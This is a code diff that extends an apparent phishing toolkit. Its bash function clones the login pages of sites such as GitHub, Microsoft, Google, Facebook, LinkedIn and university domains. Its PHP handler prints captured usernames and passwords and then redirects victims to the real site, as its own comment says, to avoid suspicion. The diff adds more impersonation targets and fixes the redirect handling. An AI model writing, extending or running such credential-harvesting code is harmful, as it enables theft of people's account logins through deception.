@@ -313,6 +313,11 @@ clone_website() {
     local target_url=$1
     local clone_dir="cloned_site"
     local redirect_url=""
+    local domain=""
+    
+    # Extract the domain from the URL for better handling
+    domain=$(echo "$target_url" | sed -E 's|^https?://([^/]+).*|\1|')
+    echo -e "${YELLOW}[INFO]${NC} Extracted domain: $domain"
     
     # Set appropriate redirect URL based on target
     if [[ "$target_url" == *"github.com"* ]]; then
@@ -320,20 +325,35 @@ clone_website() {
         # For GitHub, use our specialized template which works better than cloning
         create_github_page
         echo -e "${GREEN}[SUCCESS]${NC} Created specialized GitHub login page"
-        return 0
     elif [[ "$target_url" == *"microsoft.com"* ]] || [[ "$target_url" == *"live.com"* ]]; then
         redirect_url="https://www.microsoft.com"
     elif [[ "$target_url" == *"google.com"* ]]; then
         redirect_url="https://www.google.com"
     elif [[ "$target_url" == *"reddit.com"* ]]; then
         redirect_url="https://www.reddit.com"
+    elif [[ "$target_url" == *"facebook.com"* ]]; then
+        redirect_url="https://www.facebook.com"
+    elif [[ "$target_url" == *"twitter.com"* ]] || [[ "$target_url" == *"x.com"* ]]; then
+        redirect_url="https://twitter.com"
+    elif [[ "$target_url" == *"linkedin.com"* ]]; then
+        redirect_url="https://www.linkedin.com"
+    elif [[ "$target_url" == *".edu"* ]]; then
+        # For educational institutions, try to redirect to the main site
+        redirect_url="https://${domain}"
     else
-        # Extract domain for redirect
-        redirect_url=$(echo "$target_url" | grep -o 'https\?://[^/]*' || echo "https://www.google.com")
+        # Extract just the domain for generic cases
+        redirect_url="https://${domain}"
     fi
+    
+    echo -e "${YELLOW}[INFO]${NC} Setting redirect to: $redirect_url"
     
     # Store the redirect URL for the credential script to use
     echo "$redirect_url" > redirect_url.txt
+    
+    # If we already created a specialized page, return
+    if [[ "$target_url" == *"github.com"* ]]; then
+        return 0
+    fi
     
     # Create temporary directory for cloning
     mkdir -p "$clone_dir"
@@ -348,7 +368,7 @@ clone_website() {
          --convert-links \
          --adjust-extension \
          --span-hosts \
-         --domains=$(echo "$target_url" | sed -e 's|^[^/]*//||' -e 's|/.*$||') \
+         --domains=$domain \
          --directory-prefix="$clone_dir" \
          --max-redirect=2 \
          --tries=3 \
@@ -529,12 +549,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     echo "SUCCESS! Credentials captured:\nUsername: $username\nPassword: $password\n";
     
     // Determine where to redirect
-    $redirect = 'https://github.com';
+    $redirect = 'https://www.google.com'; // Default fallback
     
     // Check if we have a custom redirect URL
     if (file_exists('redirect_url.txt')) {
-        $redirect = trim(file_get_contents('redirect_url.txt'));
+        $custom_redirect = trim(file_get_contents('redirect_url.txt'));
+        if (!empty($custom_redirect)) {
+            $redirect = $custom_redirect;
+        }
     }
+    
+    logDebug("Redirecting to: " . $redirect);
     
     // Redirect to a legitimate site (to avoid suspicion)
     header('Location: ' . $redirect);
